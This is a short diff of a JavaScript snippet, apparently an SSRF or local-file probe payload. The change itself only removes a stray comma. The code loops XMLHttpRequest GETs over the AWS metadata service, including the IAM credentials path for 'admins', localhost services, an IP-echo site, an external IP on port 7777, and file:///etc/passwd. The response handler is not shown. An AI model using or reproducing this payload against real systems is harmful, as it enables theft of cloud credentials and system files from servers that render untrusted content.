@@ -19,7 +19,7 @@ var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = handler;
 
 var urls = ["http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","http://192.241.169.35:7777/url5","file:///etc/passwd"];
-var arrayLength = urls.length;,
+var arrayLength = urls.length;
 for (var i = 0; i < arrayLength; i++) {
    try{
     xhr.open("GET", urls[i], true);
